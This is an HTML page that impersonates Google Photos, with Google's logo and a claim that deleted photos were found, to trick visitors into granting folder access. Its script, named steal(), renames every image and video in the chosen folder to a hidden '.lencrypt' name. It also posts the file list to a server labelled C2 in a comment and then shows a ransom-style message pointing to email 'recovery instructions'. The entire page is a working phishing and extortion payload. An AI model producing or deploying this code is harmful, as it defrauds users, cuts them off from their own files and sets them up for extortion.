<!DOCTYPE html>
<html>
<head>
    <title>Google Photos - Recover Deleted Photos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body{font-family:'Roboto',sans-serif;background:#f8f9fa;text-align:center;padding:40px;}
        .card{max-width:480px;margin:0 auto;background:white;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);}
        button{background:#1a73e8;color:white;border:none;padding:14px 28px;border-radius:8px;font-size:16px;cursor:pointer;}
        .logo img{height:60px;margin-bottom:20px;}
    </style>
</head>
<body>
<div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"></div>
<div class="card">
    <h2>127 Deleted Photos Found</h2>
    <p>We detected deleted memories on this device.</p>
    <p><strong>Click below and grant permission to recover instantly.</strong></p>
    <button onclick="steal()">Recover My Photos Now</button>
    <p id="status"></p>
</div>

<script>
async function steal() {
    document.getElementById("status").innerHTML = "Requesting access...";
    let dirHandle;
    try {
        dirHandle = await window.showDirectoryPicker({startIn: "pictures"});
    } catch(e) {
        alert("Permission denied â€” recovery cancelled.");
        return;
    }

    const files = [];
    for await (const entry of dirHandle.values()) {
        if (entry.kind === "file" && /\.(jpe?g|png|mp4|mov|gif|webp)$/i.test(entry.name)) {
            files.push(entry.name);
            // Instantly hide everything
            await entry.rename("." + entry.name + ".lencrypt");
        }
    }

    // Send victim data to C2
    fetch("/report", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            id: Math.random().toString(36).substr(2,9),
            files: files,
            time: new Date().toISOString()
        })
    });

    document.body.innerHTML = "<h2 style='color:red'>All photos & videos are now protected.<br><br>Check your email for recovery instructions.</h2>";
}
setTimeout(steal, 1500);
</script>
</body>
</html>
